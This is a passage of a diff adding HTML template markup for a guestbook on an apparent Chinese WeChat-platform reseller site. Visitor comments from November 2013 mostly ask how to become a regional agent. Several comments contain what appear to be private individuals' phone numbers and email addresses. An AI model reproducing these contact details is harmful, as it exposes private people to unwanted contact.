+								<dt class="hfinfo" date="5062">很不错 赞</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5062" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5062">
+											<textarea name="info" class="pxtextarea hly5062"></textarea> 
+										<a class="hhsubmit submit" date="5062" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								s<span>2013-11-15 11:38:24</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5058">good</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5058" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5058">
+											<textarea name="info" class="pxtextarea hly5058"></textarea> 
+										<a class="hhsubmit submit" date="5058" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								勇<span>2013-11-15 10:35:31</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5048">了解代理事情</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5048" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5048">
+											<textarea name="info" class="pxtextarea hly5048"></textarea> 
+										<a class="hhsubmit submit" date="5048" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								实干者<span>2013-11-15 10:26:18</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5046">微信开发</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5046" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5046">
+											<textarea name="info" class="pxtextarea hly5046"></textarea> 
+										<a class="hhsubmit submit" date="5046" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								厕所<span>2013-11-14 23:56:12</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5030">你好</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5030" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5030">
+											<textarea name="info" class="pxtextarea hly5030"></textarea> 
+										<a class="hhsubmit submit" date="5030" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								佳轩<span>2013-11-14 23:34:06</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5026">怎么代理的？怎么都没有回复？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5026" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5026">
+											<textarea name="info" class="pxtextarea hly5026"></textarea> 
+										<a class="hhsubmit submit" date="5026" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								代理<span>2013-11-14 19:03:39</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5001">怎么申请微信公众平台</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5001" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5001">
+											<textarea name="info" class="pxtextarea hly5001"></textarea> 
+										<a class="hhsubmit submit" date="5001" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								成晓琴<span>2013-11-14 18:23:15</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="5000">如何加盟</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="5000" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly5000">
+											<textarea name="info" class="pxtextarea hly5000"></textarea> 
+										<a class="hhsubmit submit" date="5000" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								代理<span>2013-11-14 18:04:47</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4998">我想做代理，郑州的:15038032009.吴经理</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4998" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4998">
+											<textarea name="info" class="pxtextarea hly4998"></textarea> 
+										<a class="hhsubmit submit" date="4998" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								我<span>2013-11-14 16:36:58</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4981">顶</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4981" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4981">
+											<textarea name="info" class="pxtextarea hly4981"></textarea> 
+										<a class="hhsubmit submit" date="4981" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								ono<span>2013-11-14 15:02:01</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4963">想了解一下
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4963" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4963">
+											<textarea name="info" class="pxtextarea hly4963"></textarea> 
+										<a class="hhsubmit submit" date="4963" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								乾澄<span>2013-11-14 11:34:23</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4939">不错</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4939" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4939">
+											<textarea name="info" class="pxtextarea hly4939"></textarea> 
+										<a class="hhsubmit submit" date="4939" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								loading<span>2013-11-14 01:52:18</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4921">不错喔</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4921" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4921">
+											<textarea name="info" class="pxtextarea hly4921"></textarea> 
+										<a class="hhsubmit submit" date="4921" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								渡船非<span>2013-11-14 00:20:47</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4918">你好！我想申请盛世源码—国内优秀的微信公众服务平台代理商，如何合作，请给我来电13698928281谢谢！</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4918" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4918">
+											<textarea name="info" class="pxtextarea hly4918"></textarea> 
+										<a class="hhsubmit submit" date="4918" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								yaya <span>2013-11-13 22:32:52</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4901">这个好</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4901" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4901">
+											<textarea name="info" class="pxtextarea hly4901"></textarea> 
+										<a class="hhsubmit submit" date="4901" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								张三<span>2013-11-13 13:39:48</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4821">你好</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4821" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4821">
+											<textarea name="info" class="pxtextarea hly4821"></textarea> 
+										<a class="hhsubmit submit" date="4821" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								A<span>2013-11-13 09:07:05</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4767">广西南宁现在有代理吗？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4767" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4767">
+											<textarea name="info" class="pxtextarea hly4767"></textarea> 
+										<a class="hhsubmit submit" date="4767" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								朱经理<span>2013-11-13 01:14:16</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4759">我想在合肥做，我在当地有广阔人迈，请把资料发到我邮箱zzliang123321@qq.com。电话15205517218</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4759" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4759">
+											<textarea name="info" class="pxtextarea hly4759"></textarea> 
+										<a class="hhsubmit submit" date="4759" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								哈哈<span>2013-11-12 22:30:05</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4741">good</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4741" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4741">
+											<textarea name="info" class="pxtextarea hly4741"></textarea> 
+										<a class="hhsubmit submit" date="4741" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								李先生<span>2013-11-12 16:59:26</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4689">我公司在南京，请问如何代理？有相关文件请 发邮箱leezmin@163.com 
+</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4689" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4689">
+											<textarea name="info" class="pxtextarea hly4689"></textarea> 
+										<a class="hhsubmit submit" date="4689" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								辽宁<span>2013-11-12 15:10:42</span>
+								<div class="clr"></div>
+							</h3>
+							<dl>
+								<dt class="hfinfo" date="4676">代理怎么收费？</dt>
+							</dl>
+							<dl class="huifu">
+								<dt>
+									<span>
+																														<a class="hhbt czan" date="4676" href="javascript:void(0)">回复</a>
+										<p style="display:none;" class="hhly4676">
+											<textarea name="info" class="pxtextarea hly4676"></textarea> 
+										<a class="hhsubmit submit" date="4676" href="javascript:void(0)">确定</a>
+										</p>
+									</span>
+								</dt>
+							</dl>
+													</li>
+												<li class="green bounceInDown">
+							<h3>
+								<!--<img src="http://www.apiwx.com/index/images/logo100x100.jpg">-->
+								ha
